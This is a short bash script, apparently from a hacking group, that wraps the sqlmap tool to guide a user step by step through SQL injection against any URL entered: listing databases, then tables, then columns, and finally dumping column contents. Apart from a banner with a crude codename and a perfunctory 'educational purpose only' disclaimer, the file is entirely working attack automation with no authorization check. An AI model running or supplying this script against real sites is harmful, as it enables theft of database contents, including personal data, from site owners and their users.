#!/bin/bash
# LazySQLMap
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Yukinoshita 47 | Garuda Security Hacker
# More Info : http://www.garudasecurityhacker.org
#
#

# START

# Header 

echo "      ____        _____          __ __    "
echo "     /    |      / ___/         |  |  |   "
echo "    |   __|      (  \_          |  |  |   "
echo "    |  |  |      \__  |         |  _  |   "
echo "    |  |_ |      /  \ |         |  |  |   "
echo "    |     |      \    |         |  |  |   "
echo "    |___,_| aruda \___| ecurity |__|__|acker "
echo ""                                     
echo "    Let's Make Your Exploitation And Have Fun"
echo "" 
echo "    ==[ Tools Name : LazySQLMap"
echo "    ==[ Coded by : Yukinoshita 47"
echo "    ==[ Version : 1.0.0"
echo "    ==[ Codename : When My Waifu Fuck Me In My Dream"

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " GSH_LazySQLMap >>"
read TARGET
python sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read DATABASE
python sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read TABLE
python sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " GSH_LazySQLMap >>"
read COLUMN
python sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END
